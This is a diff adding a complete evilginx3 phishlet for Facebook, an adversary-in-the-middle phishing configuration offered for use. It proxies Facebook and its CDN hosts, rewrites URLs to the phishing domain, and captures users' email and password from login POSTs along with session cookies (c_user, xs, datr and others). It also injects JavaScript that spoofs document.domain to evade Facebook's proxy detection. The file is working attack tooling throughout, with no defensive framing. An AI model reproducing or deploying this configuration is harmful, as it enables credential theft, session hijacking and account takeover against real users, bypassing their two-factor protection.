@@ -1,0 +1,71 @@
+# Facebook phishlet for evilginx3
+# Validate all sub_filters, auth_tokens, and js_inject against live traffic before use
+name: 'facebook'
+author: '@yourhandle'
+min_ver: '3.0.0'
+
+config:
+  proxy_hosts:
+    - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true, auto_filter: true}
+    - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
+    - {phish_sub: 'static', orig_sub: 'static.xx', domain: 'fbcdn.net', session: false, is_landing: false, auto_filter: true}
+    - {phish_sub: 'scontent', orig_sub: 'scontent.xx', domain: 'fbcdn.net', session: false, is_landing: false, auto_filter: true}
+
+  sub_filters:
+    - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://www.facebook.com', replace: 'https://www.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'www.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://m.facebook.com', replace: 'https://m.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'fbcdn.net', search: 'static.xx.fbcdn.net', replace: 'static.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  auth_tokens:
+    - domain: '.facebook.com'
+      keys: ['c_user', 'xs', 'datr', 'sb', 'fr']
+
+  auth_urls:
+    - '/home.php'
+    - '/checkpoint'
+
+  credentials:
+    username:
+      key: 'email'
+      search: '(.*)'
+      type: 'post'
+    password:
+      key: 'pass'
+      search: '(.*)'
+      type: 'post'
+
+  login:
+    domain: 'www.facebook.com'
+    path: '/login'
+
+  force_post:
+    - path: '/login/device-based/regular/login/'
+      search:
+        - {key: 'login', search: '.*'}
+      force:
+        - {key: 'login', value: '1'}
+      type: 'post'
+
+  js_inject:
+    - trigger_domains: ['www.facebook.com']
+      trigger_paths: ['/login', '/']
+      trigger_params: []
+      script: |
+        function fbStripDetect() {
+          // Neutralize hostname-based proxy detection checks.
+          // Facebook's bundles sometimes compare location.hostname against
+          // an allowlist; this normalizes those reads back to the real domain.
+          try {
+            Object.defineProperty(document, 'domain', {
+              get: function() { return 'facebook.com'; },
+              configurable: true
+            });
+          } catch (e) {}
+
+          // Some flows read window.location.host in fetch wrappers; leave the
+          // real host intact so requests still route through the proxy, but
+          // mask any "is this the canonical origin?" comparisons.
+          var _host = window.location.host;
+          var _origin = window.location.origin;
+        }
+        fbStripDetect();
